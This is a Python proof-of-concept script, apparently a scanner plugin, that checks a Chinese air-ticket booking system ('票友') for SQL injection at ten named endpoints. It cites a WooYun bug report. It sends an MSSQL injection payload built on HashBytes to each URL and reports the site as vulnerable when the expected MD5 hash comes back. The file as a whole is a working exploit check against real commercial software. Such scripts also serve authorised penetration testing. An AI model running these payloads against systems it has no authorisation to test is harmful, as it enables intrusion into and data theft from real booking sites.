#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 票友机票预订系统10处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0118867
author: Lucifer
description: multi sqli。
'''
import sys
import requests
import warnings
from termcolor import cprint

class piaoyou_ten_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        urls = ["/Other/train_input.aspx?memberid=1",
                "/Other/hotel_input.aspx?memberid=1",
                "/Other/input.aspx?memberid=1",
                "/flight/Print_url_sel.aspx?id=2",
                "/flight/Xcd_selected.aspx?id=111",
                "/System/history.aspx?id=1",
                "/flight/scgq.aspx?id=1",
                "/Other/Edit.aspx?id=1",
                "/flight/Html.aspx?id=1",
                "/info/zclist_new.aspx?id=1"]
        try:
            for url in urls:
                vulnurl = self.url + url + "AnD/**/1=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))--"
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                    cprint("[+]存在票友机票预订系统10处SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = piaoyou_ten_sqli_BaseVerify(sys.argv[1])
    testVuln.run()
